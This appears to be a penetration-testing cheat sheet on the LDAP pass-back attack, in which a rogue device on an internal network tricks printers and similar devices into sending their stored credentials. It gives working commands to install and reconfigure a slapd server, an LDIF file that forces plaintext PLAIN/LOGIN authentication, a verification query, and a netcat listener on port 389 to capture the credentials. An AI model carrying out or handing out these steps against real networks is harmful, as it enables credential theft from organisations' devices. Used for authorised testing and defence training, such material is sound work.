# LDAP Attacks

## Pass-back Attack

- This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device

**Attack Method**

- **Host a Rogue LDAP Server**
  - `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
  - `sudo dpkg-reconfigure -p low slapd`
  - Create a new `olcSaslSecProps.ldif` file to make LDAP only support PLAIN and LOGIN authentication methods. Put the following content in the new file:
  ```
  #olcSaslSecProps.ldif
  dn: cn=config
  replace: olcSaslSecProps
  olcSaslSecProps: noanonymous,minssf=0,passcred
  ```
  - Use the new ldif file to patch your rogue LDAP
    `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
  - Verify configuration was applied to LDAP
    `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
    
- Start a Netcat listener (default LDAP port is 389)
  `nc -nlvp 389`
